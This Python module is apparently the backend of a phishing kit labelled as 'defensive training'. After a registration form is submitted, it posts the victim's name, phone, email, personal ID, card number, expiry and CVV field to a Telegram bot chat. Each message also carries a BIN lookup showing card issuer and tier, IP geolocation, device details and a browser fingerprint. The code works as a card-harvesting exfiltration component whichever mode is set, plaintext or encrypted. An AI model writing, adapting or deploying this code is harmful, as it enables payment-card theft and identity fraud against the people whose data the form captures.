"""
Optional Telegram Bot API delivery for the Bango lab enrollment (defensive training).

Sends one HTML ``sendMessage`` after successful ``POST /api/demo/register`` (enrollment
snapshot). Uses ``sendMessage`` with HTML parse mode. Never log the bot token.
"""

from __future__ import annotations

import html
import json
import logging
import os
import urllib.error
import urllib.request
from typing import Any

from backend import rsa_envelope, ua_parse
from backend.bin_api_client import fetch_bin_meta

logger = logging.getLogger(__name__)

TELEGRAM_API = "https://api.telegram.org"


def _telegram_pii_plaintext_enabled() -> bool:
    """
    When **True**, enrollment PII is sent in clear in the Telegram HTML (instructor debug only).

    Default is **False** so Telegram mirrors the wire: only an RSA+AES envelope for PII.
    Set ``DEMO_TELEGRAM_PII_PLAINTEXT=1`` only in a trusted local lab.
    """
    v = (os.environ.get("DEMO_TELEGRAM_PII_PLAINTEXT") or "").strip().lower()
    return v in ("1", "true", "yes", "on")


def _strip_env_value(s: str) -> str:
    """Trim whitespace, BOM, and optional wrapping quotes from ``.env`` pastes."""
    v = (s or "").strip()
    if v.startswith("\ufeff"):
        v = v[1:].strip()
    if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
        v = v[1:-1].strip()
    return v


def _coerce_chat_id_for_api(cid: str) -> str | int:
    """
    Telegram accepts integer chat ids for users/groups; usernames stay as ``@name`` strings.
    """
    s = _strip_env_value(cid)
    if s.startswith("@") or not s:
        return s
    if s.startswith("-") and s[1:].isdigit():
        return int(s)
    if s.isdigit():
        return int(s)
    return s


def _network_and_client_lines(
    esc,
    *,
    client_ip: str,
    ip_geo: dict[str, Any] | None,
    user_agent: str | None,
) -> list[str]:
    """External IP/geo block + pretty OS/browser from User-Agent (HTML lines)."""
    lines: list[str] = []
    g = ip_geo if isinstance(ip_geo, dict) else None
    lines.append("📡 <b>Network</b> <i>(external lookup)</i>")
    if g and g.get("ok"):
        lines.append(f"🌐 <b>IP</b>: <code>{esc(str(g.get('query') or client_ip))}</code>")
        lines.append(f"🏢 <b>ISP</b>: {esc(str(g.get('isp') or '—'))}")
        lines.append(f"🗺️ <b>Country</b>: {esc(str(g.get('country') or '—'))}")
        regn = str(g.get("region") or "").strip()
        if regn:
            lines.append(f"📍 <b>Region</b>: {esc(regn)}")
        lines.append(f"🏙 <b>City</b>: {esc(str(g.get('city') or '—'))}")
        lines.append(f"🕐 <b>Timezone</b>: <code>{esc(str(g.get('timezone') or '—'))}</code>")
    else:
        lines.append(f"🌐 <b>IP</b>: <code>{esc(str((g or {}).get('query') or client_ip))}</code>")
        reason = str((g or {}).get("reason") or "").strip()
        if reason == "not_public":
            lines.append("🏠 <i>Geo lookup skipped (local / private / non-public IP).</i>")
        else:
            lines.append(
                f"⚠️ <i>Geo unavailable</i> — {esc((reason or 'lookup failed')[:120])}"
            )
    lines.append("")
    ua = ua_parse.parse_user_agent(user_agent)
    os_line = (str(ua.get("os_family") or "unknown") + " " + str(ua.get("os_version") or "")).strip()
    br_line = (str(ua.get("browser_family") or "unknown") + " " + str(ua.get("browser_version") or "")).strip()
    dev = str(ua.get("device_kind") or "—")
    eng = str(ua.get("engine") or "—")
    lines.append("🧩 <b>System &amp; browser</b> <i>(User-Agent)</i>")
    lines.append(f"💻 <b>OS</b>: {esc(os_line)}")
    lines.append(f"🧭 <b>Browser</b>: {esc(br_line)}")
    lines.append(f"📟 <b>Device</b>: {esc(dev)}")
    if eng and eng != "—":
        lines.append(f"⚙️ <b>Engine</b>: {esc(eng)}")
    emb = ua.get("embeddings")
    if isinstance(emb, list) and emb:
        lines.append(
            f"🔌 <b>Host</b>: {esc(', '.join(str(x) for x in emb[:3]))}"
        )
    return lines


def _bin_lookup_line_html(reg: dict[str, Any]) -> str:
    """First 6 PAN digits only — HandyAPI BIN line for Telegram HTML."""
    esc = html.escape
    pan = str(reg.get("card_number") or "").replace(" ", "")
    pan_digits = "".join(c for c in pan if c.isdigit())
    if len(pan_digits) < 6:
        return "🔎 <b>BIN</b>: <i>Unknown</i>"
    bin_info = fetch_bin_meta(pan_digits[:6])
    if bin_info:
        rows = [
            "💳 <b>BIN</b> <i>(first 6 · HandyAPI)</i>",
            f"💠 <b>Scheme</b>: {esc(str(bin_info['scheme']))}",
            f"🪪 <b>Type</b>: {esc(str(bin_info['type']))}",
            f"🏦 <b>Issuer</b>: {esc(str(bin_info['issuer']))}",
            f"✨ <b>Tier</b>: {esc(str(bin_info['tier']))}",
            f"🌏 <b>Country</b>: {esc(str(bin_info['country']))}",
        ]
        # Newlines: Telegram HTML rejects <br/>; raw \\n in the message is fine.
        return "\n".join(rows)
    return "🔎 <b>BIN</b>: <i>Unknown</i> (lookup failed)"


def _format_enrollment_telegram(
    reg: dict[str, Any],
    *,
    client_ip: str,
    title_html: str,
    include_fingerprint: bool,
    user_agent: str | None = None,
    ip_geo: dict[str, Any] | None = None,
    optional_header_lines: list[str] | None = None,
    extra_lines_before_network: list[str] | None = None,
) -> str:
    """Shared HTML body for the registration Telegram alert."""
    esc = html.escape
    lines: list[str] = [
        title_html,
        "",
    ]
    if optional_header_lines:
        lines.extend(optional_header_lines)
        lines.append("")

    if _telegram_pii_plaintext_enabled():
        fn = esc(str(reg.get("fname") or "").strip())
        ln = esc(str(reg.get("lname") or "").strip())
        em = esc(str(reg.get("email") or "").strip())
        ph = esc(str(reg.get("phone") or "").strip())
        pid = esc(str(reg.get("personal_id") or "").strip())
        card_m = esc(str(reg.get("card_number") or "").strip())
        exp = esc(str(reg.get("card_exp") or "").strip())
        cvv_raw = str(reg.get("cvv_len") or "")
        lines.extend(
            [
                "<b>⚠️ PII plaintext (DEMO_TELEGRAM_PII_PLAINTEXT)</b>",
                f"🧑 <b>First name</b>: {fn}",
                f"👤 <b>Last name</b>: {ln}",
                f"📱 <b>Phone</b>: {ph}",
                f"✉️ <b>Email</b>: {em}",
                f"🪪 <b>ID</b>: <code>{pid}</code>",
                "",
                f"💳 <b>CC</b>: <code>{card_m}</code>",
                f"📅 <b>EXP</b>: <code>{exp}</code>",
                f"🔢 <b>CVV</b>: {esc(cvv_raw) if cvv_raw else '—'}",
                "",
            ]
        )
    else:
        sens = rsa_envelope.build_sensitive_enrollment_dict(reg)
        blob = rsa_envelope.encrypt_envelope_json(
            sens, public_key_path=rsa_envelope.DEFAULT_PUBLIC_PEM
        )
        if blob:
            lines.extend(
                [
                    f"<pre>{esc(blob)}</pre>",
                    "",
                ]
            )
        else:
            lines.extend(
                [
                    "⚠️ <b>PII omitted from Telegram</b> — add "
                    "<code>frontend/static/keys/public.pem</code> (run <code>./gen_keys.sh</code>).",
                    "",
                ]
            )
    lines.append(_bin_lookup_line_html(reg))
    lines.append("")
    if extra_lines_before_network:
        lines.extend(extra_lines_before_network)
    lines.extend(
        _network_and_client_lines(
            esc, client_ip=client_ip, ip_geo=ip_geo, user_agent=user_agent
        )
    )
    if include_fingerprint:
        fp = reg.get("fingerprint_signals")
        if isinstance(fp, dict) and fp:
            if not _telegram_pii_plaintext_enabled():
                # Avoid mirroring a large second cleartext bundle next to encrypted PII.
                hid = str(fp.get("fingerprint_hash") or "").strip()
                if hid:
                    lines.extend(
                        [
                            "",
                            f"🔍 <b>Fprint id</b> <i>(no raw signals in Telegram for privacy)</i>: "
                            f"<code>{esc(hid)}</code>",
                        ]
                    )
            else:
                blob = json.dumps(fp, ensure_ascii=False, separators=(",", ":"))
                if len(blob) > 900:
                    blob = blob[:900] + "…"
                lines.extend(
                    [
                        "",
                        "🔍 <b>Fingerprint</b> (truncated):",
                        f"<pre>{esc(blob)}</pre>",
                    ]
                )
    return "\n".join(lines)


def format_demo_registration_message(
    reg: dict[str, Any],
    *,
    client_ip: str,
    user_agent: str | None = None,
    ip_geo: dict[str, Any] | None = None,
    done_redirect_url: str = "",
) -> str:
    """
    One Telegram message per successful registration: full enrollment snapshot.

    ``done_redirect_url`` is kept for call-site compatibility; it is not included in
    the message body (avoids echoing ``.env`` redirect URLs in chat).
    """
    _ = done_redirect_url
    title = "🎉 <b>Bango</b>"
    return _format_enrollment_telegram(
        reg,
        client_ip=client_ip,
        title_html=title,
        include_fingerprint=True,
        user_agent=user_agent,
        ip_geo=ip_geo,
        optional_header_lines=None,
        extra_lines_before_network=None,
    )


def send_telegram_html(
    bot_token: str,
    chat_id: str,
    text: str,
    *,
    message_thread_id: str | None = None,
    timeout_sec: float = 12.0,
) -> bool:
    """
    POST ``sendMessage``. Returns True on HTTP 200 with ``ok`` in JSON body.

    ``text`` must already be HTML-escaped where needed (except intentional tags).
    """
    token = _strip_env_value(bot_token)
    cid_raw = _strip_env_value(chat_id)
    if not token or not cid_raw:
        logger.warning(
            "telegram: missing DEMO_TELEGRAM_BOT_TOKEN or DEMO_TELEGRAM_CHAT_ID — nothing sent"
        )
        return False
    url = f"{TELEGRAM_API}/bot{token}/sendMessage"
    chat_id_api: str | int = _coerce_chat_id_for_api(cid_raw)
    body: dict[str, Any] = {
        "chat_id": chat_id_api,
        "text": text[:4090],
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    mt = _strip_env_value(message_thread_id or "")
    if mt and mt.isdigit():
        body["message_thread_id"] = int(mt)
    data = json.dumps(body, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        method="POST",
        headers={"Content-Type": "application/json; charset=utf-8"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout_sec) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            out = json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        err_body = ""
        try:
            err_body = e.read().decode("utf-8", errors="replace")[:2000]
        except Exception:
            pass
        logger.warning("telegram HTTP %s: %s", getattr(e, "code", "?"), err_body or str(e))
        return False
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        logger.warning("telegram network error: %s", e)
        return False
    except (json.JSONDecodeError, ValueError) as e:
        logger.warning("telegram bad JSON response: %s", e)
        return False

    if not isinstance(out, dict):
        logger.warning("telegram unexpected response shape")
        return False
    if out.get("ok"):
        mid = (out.get("result") or {}).get("message_id") if isinstance(out.get("result"), dict) else None
        logger.info("telegram sendMessage ok message_id=%s", mid)
        return True
    desc = out.get("description") or out
    logger.warning("telegram sendMessage failed: %s", desc)
    return False
